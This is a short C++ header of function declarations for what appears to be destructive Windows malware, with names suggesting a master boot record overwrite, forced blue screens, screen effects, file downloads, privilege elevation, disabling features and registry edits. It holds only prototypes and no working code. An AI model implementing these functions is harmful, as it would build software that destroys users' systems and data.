#include <string>
using namespace std;

#ifndef MBR_H
#define MBR_H
int MBR();
#endif

#ifndef BSOD_H
#define BSOD_H
int BSOD();
#endif

#ifndef TEXTO_H
#define TEXTO_H
int TextO(LPCWSTR lpText);
#endif

#ifndef ICONS_H
#define ICONS_H
int Icons();
#endif

#ifndef SCUAER_H
#define SCUAER_H
int Scuaer(int red, int green, int blue);
#endif

#ifndef MELT_H
#define MELT_H
int Melt();
#endif

#ifndef INVERS_H
#define INVERS_H
int Invers();
#endif

#ifndef DOWNLOAD_H
#define DOWNLOAD_H
int Download();
#endif

#ifndef ADMIN_H
#define ADMIN_H
int Admin();
#endif

#ifndef DISABLE_H
#define DISABLE_H
int Disable();
#endif

#ifndef GETFURL_H
#define GETFURL_H
bool GetFileURL(const wchar_t* dwnld_URL, const wchar_t* savepath);
#endif

#ifndef CRK_H
#define CRK_H
bool CRK(HKEY key, wstring path, wstring name);
#endif

#ifndef DRK_H
#define DRK_H
bool DRK(HKEY key, wstring path, wstring name);
#endif

#ifndef SRV_H
#define SRV_H
bool SRV(HKEY key, wstring path, wstring name, wstring value);
#endif
